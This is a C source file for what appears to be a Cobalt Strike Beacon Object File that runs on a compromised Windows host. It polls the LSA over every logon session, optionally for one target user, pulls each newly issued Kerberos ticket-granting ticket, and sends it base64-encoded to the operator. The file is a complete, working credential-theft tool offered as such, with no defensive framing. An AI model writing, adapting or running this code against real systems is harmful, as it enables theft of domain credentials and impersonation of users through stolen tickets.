#include <windows.h>
#include "beacon.h"
#include "common.h"

NTSTATUS IsSystem() {
    return STATUS_SUCCESS; 
}

NTSTATUS GetLsaHandle(HANDLE* hLsa) {
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hLsaLocal = NULL;
    LSA_OPERATIONAL_MODE mode = 0;
    
    LSA_STRING lsaString = { .Buffer = "Winlogon", .Length = 8, .MaximumLength = 9 };
    status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaRegisterLogonProcess failed.\n");
        return status;
    }
    
    *hLsa = hLsaLocal;
    return STATUS_SUCCESS;
}

NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING target, PUCHAR* ticket, PULONG ticketSize) {
    NTSTATUS status = STATUS_SUCCESS;
    NTSTATUS protocolStatus = STATUS_SUCCESS;
    KERB_RETRIEVE_TKT_REQUEST* request = NULL;
    KERB_RETRIEVE_TKT_RESPONSE* response = NULL;
    ULONG requestSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + target.MaximumLength;
    ULONG responseSize = 0;

    request = (KERB_RETRIEVE_TKT_REQUEST*)MemAlloc(requestSize);
    if (!request)
        return STATUS_MEMORY_NOT_ALLOCATED;

    request->MessageType = KerbRetrieveEncodedTicketMessage;
    request->LogonId = luid;
    request->TicketFlags = 0;
    request->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    request->EncryptionType = 0;
    request->TargetName = target;
    request->TargetName.Buffer = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    _memcpy(request->TargetName.Buffer, target.Buffer, target.MaximumLength);

    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, (PVOID*)&response, &responseSize, &protocolStatus);
    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus) || !response) {
        MemFree(request);
        return status;
    }

    *ticketSize = response->Ticket.EncodedTicketSize;
    *ticket = (PUCHAR)MemAlloc(*ticketSize);
    if (!*ticket) {
        MemFree(request);
        SECUR32$LsaFreeReturnBuffer(response);
        return STATUS_MEMORY_NOT_ALLOCATED;
    }

    _memcpy(*ticket, response->Ticket.EncodedTicket, *ticketSize);
    SECUR32$LsaFreeReturnBuffer(response);
    MemFree(request);
    return STATUS_SUCCESS;
}

NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTICKET_CACHE cache) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG sessionCount   = 0;
    PLUID sessionList    = NULL;
    cache->tickets = NULL;
    cache->count   = 0;

    // Enumerate all current logon sessions
    status = SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessionList);
    if (!NT_SUCCESS(status))
        return status;
    
    cache->tickets = (PTICKET_ENTRY)MemAlloc(sessionCount * 64 * sizeof(TICKET_ENTRY));
    if (!cache->tickets) {
        SECUR32$LsaFreeReturnBuffer(sessionList);
        return STATUS_MEMORY_NOT_ALLOCATED;
    }
    
    for (ULONG i = 0; i < sessionCount; i++) {

        // Get actual data for logon session
        PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
        status = SECUR32$LsaGetLogonSessionData(&sessionList[i], &sessionData);
        if (!NT_SUCCESS(status) || !sessionData)
            continue;

        // Check if a target user has been set
        if (targetUser && targetUser[0] != '\0') {
            char username[256] = { 0 };
            if (sessionData->UserName.Buffer && sessionData->UserName.Length > 0)
                KERNEL32$WideCharToMultiByte(CP_ACP, 0, sessionData->UserName.Buffer, sessionData->UserName.Length / 2, username, sizeof(username), NULL, NULL);

            if (_strcmp(username, targetUser) != 0) {
                SECUR32$LsaFreeReturnBuffer(sessionData);
                continue;
            }
        }
            
        KERB_QUERY_TKT_CACHE_REQUEST request = { .MessageType = KerbQueryTicketCacheExMessage, .LogonId = sessionData->LogonId };
        SECUR32$LsaFreeReturnBuffer(sessionData);

        KERB_QUERY_TKT_CACHE_EX_RESPONSE* response = NULL;
        ULONG responseSize = 0;
        NTSTATUS protoStatus  = 0;

        // Query LSA to retrieve ticket cache information
        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &request, sizeof(request), (PVOID*)&response, &responseSize, &protoStatus);
        if (!NT_SUCCESS(status) || !response)
            continue;

        // Iterate through result to find TGTs
        BOOL krbtgtFound = FALSE;
        for (ULONG j = 0; j < response->CountOfTickets; j++) {
            KERB_TICKET_CACHE_INFO_EX* t = &response->Tickets[j];

            // Deduplicate TGTs per session
            char spn[256] = { 0 };
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerName.Buffer, t->ServerName.Length / 2, spn, sizeof(spn), NULL, NULL);

            if (_strncmp(spn, "krbtgt/", 7) == 0) {
                if (krbtgtFound) continue;
                krbtgtFound = TRUE;
            }

            // Copy fields on the ticket entry
            PTICKET_ENTRY entry = &cache->tickets[cache->count++];
            entry->luid = sessionList[i];

            USHORT spnLen = t->ServerName.Length < (USHORT)(sizeof(entry->spn) - 2) ? t->ServerName.Length : (USHORT)(sizeof(entry->spn) - 2);
            _memcpy(entry->spn, t->ServerName.Buffer, spnLen);

            USHORT cnLen = t->ClientName.Length < (USHORT)(sizeof(entry->clientName) - 2) ? t->ClientName.Length : (USHORT)(sizeof(entry->clientName) - 2);
            _memcpy(entry->clientName, t->ClientName.Buffer, cnLen);

            USHORT crLen = t->ClientRealm.Length < (USHORT)(sizeof(entry->clientRealm) - 2) ? t->ClientRealm.Length : (USHORT)(sizeof(entry->clientRealm) - 2);
            _memcpy(entry->clientRealm, t->ClientRealm.Buffer, crLen);

            USHORT srLen = t->ServerRealm.Length < (USHORT)(sizeof(entry->serverRealm) - 2) ? t->ServerRealm.Length : (USHORT)(sizeof(entry->serverRealm) - 2);
            _memcpy(entry->serverRealm, t->ServerRealm.Buffer, srLen);

            entry->cacheInfo = *t;
            entry->cacheInfo.ServerName.Buffer = entry->spn; 
            entry->cacheInfo.ServerName.Length = spnLen; 
            entry->cacheInfo.ServerName.MaximumLength = sizeof(entry->spn);

            entry->cacheInfo.ClientName.Buffer = entry->clientName; 
            entry->cacheInfo.ClientName.Length = cnLen; 
            entry->cacheInfo.ClientName.MaximumLength = sizeof(entry->clientName);

            entry->cacheInfo.ClientRealm.Buffer = entry->clientRealm; 
            entry->cacheInfo.ClientRealm.Length = crLen; 
            entry->cacheInfo.ClientRealm.MaximumLength = sizeof(entry->clientRealm);

            entry->cacheInfo.ServerRealm.Buffer = entry->serverRealm;
            entry->cacheInfo.ServerRealm.Length = srLen; 
            entry->cacheInfo.ServerRealm.MaximumLength = sizeof(entry->serverRealm);
        }

        SECUR32$LsaFreeReturnBuffer(response);
    }

    SECUR32$LsaFreeReturnBuffer(sessionList);
    return STATUS_SUCCESS;
}

#define PrintFlag(mask, name) if (flags & (mask)) { BeaconPrintf(CALLBACK_OUTPUT, f ? name : ", " name); f = FALSE; }

VOID PrintTicketInformation(PTICKET_ENTRY entry, PBYTE ticket, ULONG ticketSize) {
    
    KERB_TICKET_CACHE_INFO_EX* cacheInfo = &entry->cacheInfo;
    SYSTEMTIME now, start, end, renew;
    
    KERNEL32$GetSystemTime(&now);
    start = ConvertToSystemtime(cacheInfo->StartTime);
    end   = ConvertToSystemtime(cacheInfo->EndTime);
    renew = ConvertToSystemtime(cacheInfo->RenewTime);

    // Build "ClientName@ClientRealm"
    char user[512] = { 0 };
    int cnChars = cacheInfo->ClientName.Length / 2;
    int crChars = cacheInfo->ClientRealm.Length / 2;
    int cnBytes = KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo->ClientName.Buffer, cnChars, user, sizeof(user) - 1, NULL, NULL);
    if (cnBytes < 0) cnBytes = 0;
    user[cnBytes] = '@';
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, cacheInfo->ClientRealm.Buffer, crChars, user + cnBytes + 1, (int)sizeof(user) - cnBytes - 2, NULL, NULL);

    // Header
    int nowHour = now.wHour % 12; if (!nowHour) nowHour = 12;
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d/%d/%d %d:%02d:%02d %s UTC - Found new TGT:\n",
        now.wMonth, now.wDay, now.wYear, nowHour, now.wMinute, now.wSecond,
        now.wHour >= 12 ? "PM" : "AM");

    // Fields
    BeaconPrintf(CALLBACK_OUTPUT, "  User           :  %s\n", user);

    int sh = start.wHour % 12; if (!sh) sh = 12;
    int eh = end.wHour   % 12; if (!eh) eh = 12;
    int rh = renew.wHour % 12; if (!rh) rh = 12;
    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  %d/%d/%d %d:%02d:%02d %s\n",
        start.wMonth, start.wDay, start.wYear, sh, start.wMinute, start.wSecond, start.wHour >= 12 ? "PM" : "AM");
    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  %d/%d/%d %d:%02d:%02d %s\n",
        end.wMonth, end.wDay, end.wYear, eh, end.wMinute, end.wSecond, end.wHour >= 12 ? "PM" : "AM");
    BeaconPrintf(CALLBACK_OUTPUT, "  RenewTill      :  %d/%d/%d %d:%02d:%02d %s\n",
        renew.wMonth, renew.wDay, renew.wYear, rh, renew.wMinute, renew.wSecond, renew.wHour >= 12 ? "PM" : "AM");

    // Flags (comma-separated)
    UINT flags = cacheInfo->TicketFlags;
    BOOL f = TRUE;
    BeaconPrintf(CALLBACK_OUTPUT, "  Flags          :  ");
    PrintFlag(reserved, "reserved")
    PrintFlag(forwardable, "forwardable")
    PrintFlag(forwarded, "forwarded")
    PrintFlag(proxiable, "proxiable")
    PrintFlag(proxy, "proxy")
    PrintFlag(may_postdate, "may_postdate")
    PrintFlag(postdated, "postdated")
    PrintFlag(invalid, "invalid")
    PrintFlag(renewable, "renewable")
    PrintFlag(initial, "initial")
    PrintFlag(pre_authent, "pre_authent")
    PrintFlag(hw_authent, "hw_authent")
    PrintFlag(ok_as_delegate, "ok_as_delegate")
    PrintFlag(anonymous, "anonymous")
    PrintFlag(name_canonicalize, "name_canonicalize")
    PrintFlag(enc_pa_rep, "enc_pa_rep")
    PrintFlag(reserved1, "reserved1")
    BeaconPrintf(CALLBACK_OUTPUT, "\n");    
}

VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CACHE curr) {

    int newCount = 0;

    // Compare ticket caches to identify new TGTs
    for (int i = 0; i < curr->count; i++) {
        PTICKET_ENTRY currEntry = &curr->tickets[i];
        BOOL found = FALSE;

        for (int j = 0; j < prev->count; j++) {
            PTICKET_ENTRY prevEntry = &prev->tickets[j];
            if (
                currEntry->luid.LowPart == prevEntry->luid.LowPart  &&
                currEntry->luid.HighPart == prevEntry->luid.HighPart  &&
                _memcmp(currEntry->spn, prevEntry->spn, sizeof(currEntry->spn)) == 0
            ){
                found = TRUE;
                break;
            }
        }

        // Print new TGT
        if (!found) {
            UNICODE_STRING target = {
                .Buffer = currEntry->spn,
                .Length = (USHORT)(_wcslen(currEntry->spn) * 2),
                .MaximumLength = (USHORT)(_wcslen(currEntry->spn) * 2 + 2)
            };

            PBYTE ticket = NULL;
            ULONG ticketSize = 0;
            if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, currEntry->luid, target, &ticket, &ticketSize))) {
                PrintTicketInformation(currEntry, ticket, ticketSize);
                if (ticket && ticketSize) {
                    char* b64 = Base64Encode(ticket, ticketSize);
                    if (b64) {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", b64);
                        MemFree(b64);
                    }
                }
                MemFree(ticket);
                newCount++;
            }
        }
    }

    if (newCount > 0)
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Tickets in cache: %d\n", curr->count);
}

VOID go(char* args, int argc) {
    
    datap parser = { 0 };
    HANDLE hStop = BeaconGetStopJobEvent();
        
    BeaconDataParse(&parser, args, argc);
    int interval = BeaconDataInt(&parser);
    char* targetUser = BeaconDataExtract(&parser, NULL);
        
    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
        return;
    }
    
    HANDLE hLsa = 0;
    if (!NT_SUCCESS(GetLsaHandle(&hLsa))){
        return;
    }
    
    ULONG authPackage = 0;
    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
    if (!NT_SUCCESS(SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage))) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting TGT monitor (interval: %ds)\n", interval);
    if (targetUser && targetUser[0] != '\0'){
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target user: %s\n", targetUser);
    }
    BeaconWakeup(); 

    TICKET_CACHE prev = { 0 };
    TICKET_CACHE curr = { 0 };
    
    do {
        if (NT_SUCCESS(EnumerateTickets(hLsa, authPackage, targetUser, &curr))) {
            RefreshCache(hLsa, authPackage, &prev, &curr);
            if (prev.tickets)
                MemFree(prev.tickets);
            prev = curr;
            curr = (TICKET_CACHE){ 0 };
        }

        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, interval * 1000, FALSE);
        if (wait == WAIT_OBJECT_0)
            break;
        if (wait != WAIT_TIMEOUT)
            break;

    } while (TRUE);

    if (prev.tickets)
        MemFree(prev.tickets);
    if (curr.tickets)
        MemFree(curr.tickets);

    SECUR32$LsaDeregisterLogonProcess(hLsa);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
    return;
}
